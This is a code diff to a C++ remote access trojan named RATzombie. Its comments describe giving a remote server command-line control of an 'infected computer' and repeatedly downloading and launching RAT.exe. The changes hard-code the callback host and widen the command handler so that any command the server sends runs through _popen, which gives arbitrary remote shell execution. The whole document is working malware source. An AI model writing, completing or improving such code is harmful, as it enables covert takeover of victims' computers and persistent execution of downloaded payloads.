@@ -1,3 +1,23 @@
+//
+// RATzombie.cpp
+//
+//
+// The program attempts to connect to a server and port
+// specified on the command line or hard coded. Once connected,
+// it gives a command line access of the infected computer to the
+// remote server. The availlaible commands are cd, dir, mkdir, rmdir, 
+// del (delete files only) the program sends a file name to the server, waits 
+// for a response and receives the file, the RAT.exe. The program will then attempt
+// to launch the .exe AND WILL CONTINU TO DO SO every 5 seconds, until 
+// the .exe is terminated by the remote server user with the command "exit"
+//
+// Compile and link with wsock32.lib.
+// Targeting the /SUBSYSTEM:windows, with mainCRTStartup entry point
+//
+// Pass the server name, port number, and file name on the command line. 
+//
+// Example: Client MyMachineName 2000 RAT.exe
+//
 #include <stdio.h>
 #include <stdlib.h>
 #include <winsock.h>
@@ -15,7 +35,7 @@ using namespace std;
 int RatServer(short nPort, char* szServer);
 int startProcess(string Args);
 
-//#define HARD_CODED
+#define HARD_CODED
 #define HOST "127.0.0.1" //Can be Name or IP address
 #define PORT 2030
 
@@ -35,7 +55,7 @@ int main(int argc, char **argv)
 		cout << "\nSyntax: RAT ServerName PortNumber";
 		cout << endl;
 		return 0;
-	}
+}
 	nPort = atoi(argv[2]);
 	host = argv[1];
 
@@ -47,7 +67,7 @@ int main(int argc, char **argv)
 	//
 	WSACleanup();
 
-	return 0;
+	return 0;//(result == 0 ? 0:1);
 }
 
 int RatServer(short nPort, char *szServer) {
@@ -114,13 +134,13 @@ int RatServer(short nPort, char *szServer) {
 					temp += "StartProcess returned ";
 					temp += to_string(startProcess(arguments));
 				}
-				else if (Command == "dir" || Command == "mkdir" || Command == "rmdir" || Command == "del")
+				else if (Command != "exit")
 				{
 					if (Command == "del")
 						Input = Command + " /F /Q " + arguments;
 
 					if ((pPipe = _popen(Input.c_str(), "rt")) == NULL)
-						exit(1);
+						temp += "\n\rFailed or was not recognized\n\r";
 
 					/* Read pipe until end of file, or an error occurs. */
 
@@ -136,12 +156,10 @@ int RatServer(short nPort, char *szServer) {
 					}
 					else
 					{
-						printf("Error: Failed to read the pipe to the end.\n");
+						temp += ("\n\rError: Failed to read the pipe to the end.\n\r");
 					}
 				}
-				else if (Command != "exit") {
-					cout << Command << " " << arguments << " is not recognised";
-				}
+				
 			//Continu de recevoir des commandes tant que n'a pas recu "exit"
 			} while (Command != "exit");
 		}
